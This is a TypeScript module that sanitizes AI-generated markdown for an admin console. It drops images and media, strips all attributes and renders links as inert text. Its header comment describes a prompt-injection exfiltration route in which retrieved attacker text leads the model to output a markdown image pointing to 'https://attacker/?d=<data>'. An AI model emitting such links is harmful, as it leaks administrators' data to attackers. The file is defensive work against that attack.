// The AI answer renderer (spec §0.13). **THIS MODULE OWNS ITS OWN ALLOWLIST AND
// IMPORTS NOTHING FROM THE DOCS MODULE.**
//
// WHY NOT REUSE `modules/docs/markdown.ts`. It is a good sanitizer, it already
// drops `<img>`, and reusing it would be less code. Two reasons not to:
//
//   1. It preserves `<a href>` as a LIVE LINK. §0.13 requires links rendered as
//      click-through text with the target shown — never auto-fetched, never
//      prefetched — which is a different policy, not a stricter setting of the
//      same one.
//   2. **A SHARED ALLOWLIST IS A SHARED BLAST RADIUS.** That file's allowlist is
//      the docs module's, tuned for documentation articles a colleague wrote. A
//      future docs change adding `img` — entirely reasonable there — would
//      silently widen the renderer that displays MODEL OUTPUT DERIVED FROM
//      UNAUTHENTICATED ATTACKER-CONTROLLED TEXT, with no test in this module
//      going red. The approach is reused; the policy is owned here.
//
// WHAT THIS RENDERER IS DEFENDING AGAINST. A read-only agent with no outbound
// tool cannot exfiltrate — unless the renderer provides the egress. Retrieved
// text reaches model context by design, and model output reaches this function,
// so an answer containing `![](https://attacker/?d=<data>)` would make the
// administrator's own browser issue the request. There is no app-tier CSP to
// lean on: `app/api/security_headers.py` sets only `X-Content-Type-Options` and
// a `no-store` on the checkout path; TLS/HSTS and any CSP live at the edge.
//
// THE ATTRIBUTE POLICY IS "NONE, EVER", NOT A DENYLIST. Elements are rebuilt
// with `document.createElement` and no attribute is ever copied across. A
// denylist of dangerous attributes has to be right every time and forgets
// `srcset`, `background`, `ping`, `formaction`, and `style:
// background-image:url(...)` — which is the same fetch as an `<img>` under a
// friendlier name. Nothing is copied, so nothing has to be remembered.
//
// THE COST, ACCEPTED (§0.13): answers cannot render charts or embedded media.
// Read mode returns text and tables.

import { Marked } from "marked";

// A LOCAL parser instance, never the shared `marked` singleton: calling
// `marked.use(...)` would reconfigure every other renderer in the console,
// including the docs module's.
const parser = new Marked({
  renderer: {
    // Images are disabled at the markdown layer as well as dropped at the DOM
    // layer. Either alone would do; both means a change to one is not silently
    // load-bearing.
    image() {
      return "";
    },
  },
});

// Tags kept, rebuilt attribute-free. Anything that can name a URL, run code,
// load a font, or hold a style is absent by construction.
const ALLOWED_TAGS = new Set([
  "p",
  "strong",
  "em",
  "del",
  "code",
  "pre",
  "ul",
  "ol",
  "li",
  "h1",
  "h2",
  "h3",
  "h4",
  "h5",
  "h6",
  "blockquote",
  "table",
  "thead",
  "tbody",
  "tr",
  "th",
  "td",
  "hr",
  "br",
]);

// Dropped WITH their children, rather than unwrapped. For a `<script>` the
// children are code; for an `<svg>` they are a second markup language with its
// own `href`; for a `<style>` they are CSS that can fetch. Unwrapping any of
// them would put that content back on the page as text at best.
const DROPPED_WITH_CHILDREN = new Set([
  "img",
  "picture",
  "source",
  "iframe",
  "object",
  "embed",
  "svg",
  "math",
  "video",
  "audio",
  "track",
  "canvas",
  "script",
  "style",
  "link",
  "meta",
  "base",
  "form",
  "input",
  "button",
  "textarea",
  "select",
  "option",
  "map",
  "area",
  "frame",
  "frameset",
  "portal",
  "template",
  "noscript",
]);

/**
 * A link as INERT TEXT with its target shown (§0.13).
 *
 * No `href`, no `ping`, no `rel`, no `target`. A preloader follows `href`; a
 * `<link rel=prefetch>` and an `<a ping>` follow attributes too. The
 * administrator can read where it points and copy it deliberately, which is the
 * click-through the spec asks for.
 */
function linkAsText(element: Element): Node {
  const wrapper = document.createElement("span");
  wrapper.className = "ai-link";
  const label = document.createElement("span");
  label.textContent = element.textContent ?? "";
  wrapper.appendChild(label);
  const target = element.getAttribute("href") ?? "";
  if (target) {
    const shown = document.createElement("code");
    shown.className = "ai-link-target";
    shown.textContent = ` (${target})`;
    wrapper.appendChild(shown);
  }
  return wrapper;
}

function rebuild(source: Node, output: Node): void {
  for (const child of Array.from(source.childNodes)) {
    if (child.nodeType === Node.TEXT_NODE) {
      output.appendChild(document.createTextNode(child.textContent ?? ""));
      continue;
    }
    if (child.nodeType !== Node.ELEMENT_NODE) continue;
    const element = child as Element;
    const tag = element.tagName.toLowerCase();
    if (DROPPED_WITH_CHILDREN.has(tag)) continue;
    if (tag === "a") {
      output.appendChild(linkAsText(element));
      continue;
    }
    if (!ALLOWED_TAGS.has(tag)) {
      // An unknown wrapper keeps its (rebuilt) children and loses itself, so an
      // answer is never silently emptied by a tag nobody anticipated.
      rebuild(element, output);
      continue;
    }
    // NO ATTRIBUTE IS EVER COPIED. See the module header.
    const clean = document.createElement(tag);
    rebuild(element, clean);
    output.appendChild(clean);
  }
}

/**
 * `markdown` as sanitized HTML for one AI answer.
 *
 * The intermediate parse uses `DOMParser`, whose documents have no browsing
 * context and therefore fetch nothing while being inspected; the rebuilt tree
 * is what reaches the page.
 */
export function renderAiMarkdown(markdown: string): string {
  const raw = parser.parse(markdown, { async: false });
  const parsed = new DOMParser().parseFromString(raw, "text/html");
  const container = document.createElement("div");
  rebuild(parsed.body, container);
  return container.innerHTML;
}
